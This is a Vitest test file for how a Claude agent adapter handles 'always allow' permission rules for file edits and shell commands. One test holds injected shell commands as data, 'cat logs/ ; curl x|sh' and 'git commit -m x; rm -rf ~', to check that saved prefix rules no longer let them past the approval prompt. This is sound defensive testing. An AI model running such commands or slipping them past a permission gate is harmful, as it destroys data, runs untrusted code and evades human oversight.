import { describe, expect, it, vi } from 'vitest'
import type { NormalizedEvent } from '@cc/protocol'
import { answerOrCard } from '../approval-outcome.test-helpers.js'

/**
 * "Always allow" for file edits (#170). The UI sends the path as the matcher for a file edit, and
 * the manager saves it and reapplies it after a restart — but the Claude adapter was looking up
 * edits by the key `Edit:file_edit`, so it asked again every time the same file was edited again.
 * Here the SDK is swapped for a fake and the `canUseTool` the adapter passed is called directly.
 */
type CanUseTool = (name: string, input: Record<string, unknown>) => Promise<{ behavior: string }>
const sdk = vi.hoisted(() => ({ canUseTool: null as CanUseTool | null }))

vi.mock('@anthropic-ai/claude-agent-sdk', () => ({
  query: ({ options }: { options: { canUseTool?: CanUseTool } }) => {
    sdk.canUseTool = options.canUseTool ?? null
    return {
      // eslint-disable-next-line require-yield -- a stream where the CLI says nothing; this test only calls the callback
      async *[Symbol.asyncIterator]() {
        await new Promise(() => {})
      },
      interrupt: async () => {},
      close: () => {},
      supportedCommands: async () => [],
      getContextUsage: async () => undefined,
    }
  },
}))

const { ClaudeAdapter } = await import('./index.js')

const EDIT = { file_path: '/x/a.ts', old_string: 'a', new_string: 'b' }

async function session() {
  const events: NormalizedEvent[] = []
  const handle = await new ClaudeAdapter().createSession({ sessionId: 's1', cwd: '/x', permissionPreset: 'safe' }, (e) => events.push(e))
  const asks = () => events.filter((e) => e.type === 'approval_request')
  /** The callback's answer, or 'still asking' once it raised a card for the person */
  const answer = async (name: string, input: Record<string, unknown>) => {
    const r = await answerOrCard(() => sdk.canUseTool!(name, input), () => asks().length)
    return r === 'still asking' ? r : r.behavior
  }
  return { handle, canUseTool: sdk.canUseTool!, asks, answer }
}

describe('"Always allow" for Claude file edits (#170)', () => {
  it('does not ask again for the next edit to an always-allowed path — other files still get asked', async () => {
    const { handle, canUseTool, asks, answer } = await session()
    const first = canUseTool('Edit', EDIT)
    const ask = asks()[0] as Extract<NormalizedEvent, { type: 'approval_request' }>
    expect(ask.detail).toMatchObject({ kind: 'file_edit', path: '/x/a.ts' })

    // Exactly the matcher the UI sends (store.respondApproval: for edits it is detail.path).
    handle.respondApproval(ask.requestId, 'always', 'session', '/x/a.ts')
    expect((await first).behavior).toBe('allow')

    expect(await answer('Edit', { ...EDIT, new_string: 'c' })).toBe('allow')
    expect(asks()).toHaveLength(1)

    void canUseTool('Edit', { ...EDIT, file_path: '/x/b.ts' })
    expect(asks()).toHaveLength(2)
    await handle.dispose()
  })

  /*
   * One rule for both adapters (#428): "always" with no matcher remembers nothing. Claude used to fall back to the
   * command text, a rule the manager never saved (it saves only a matcher it was given) and the screen never named:
   * live until the process restarted, then gone.
   */
  it('"always" with no matcher allows this call and remembers nothing', async () => {
    const { handle, canUseTool, asks, answer } = await session()
    const first = canUseTool('Bash', { command: 'npm test' })
    const ask = asks()[0] as Extract<NormalizedEvent, { type: 'approval_request' }>
    handle.respondApproval(ask.requestId, 'always', 'session')
    expect((await first).behavior).toBe('allow')
    expect(await answer('Bash', { command: 'npm test' })).toBe('still asking')
    expect(asks()).toHaveLength(2)
    await handle.dispose()
  })

  // The UI's matcher for a command is trimmed (core's suggestMatcher); the key it is matched against must be too (#428)
  it('a command with surrounding whitespace matches the rule made from it', async () => {
    const { handle, canUseTool, asks, answer } = await session()
    const first = canUseTool('Bash', { command: ' npm test\n' })
    const ask = asks()[0] as Extract<NormalizedEvent, { type: 'approval_request' }>
    handle.respondApproval(ask.requestId, 'always', 'session', 'npm test')
    expect((await first).behavior).toBe('allow')
    expect(await answer('Bash', { command: ' npm test\n' })).toBe('allow')
    expect(asks()).toHaveLength(1)
    await handle.dispose()
  })

  /*
   * A rule is the command matched whole (#838). A trailing `*` used to make a rule a prefix, so "always" on
   * `cat logs/*` let `cat logs/ ; curl x|sh` through with no card. Such a rule, saved by an older build and restored
   * at session start, now allows none of the commands it starts; a command ending in `*` has no key at all, since an
   * older host serving the same store would read a rule for it widely.
   */
  it('a saved rule ending in * allows no command it starts', async () => {
    const { handle, canUseTool, asks } = await session()
    handle.applyRules!(['cat logs/*', 'git commit*'])
    expect(await answer(canUseTool('Bash', { command: 'cat logs/ ; curl x|sh' }))).toBe('still asking')
    expect(await answer(canUseTool('Bash', { command: 'git commit -m x; rm -rf ~' }))).toBe('still asking')
    expect(await answer(canUseTool('Bash', { command: 'cat logs/*' }))).toBe('still asking')
    expect(asks()).toHaveLength(3)
    await handle.dispose()
  })

  // A rule is only the command's text, so it cannot tell a run outside the sandbox from the plain command (#838)
  it('a command outside the sandbox is asked even when its text has a rule', async () => {
    const { handle, canUseTool, asks } = await session()
    handle.applyRules!(['npm test'])
    expect(await answer(canUseTool('Bash', { command: 'npm test' }))).toBe('allow')
    expect(await answer(canUseTool('Bash', { command: 'npm test', dangerouslyDisableSandbox: true }))).toBe('still asking')
    expect(asks()).toHaveLength(1)
    await handle.dispose()
  })

  it('also honors the path rules (applyRules) saved and restored after a restart', async () => {
    const { handle, asks, answer } = await session()
    handle.applyRules!(['/x/a.ts'])
    expect(await answer('Write', { file_path: '/x/a.ts', content: 'new' })).toBe('allow')
    expect(asks()).toHaveLength(0)
    await handle.dispose()
  })
})
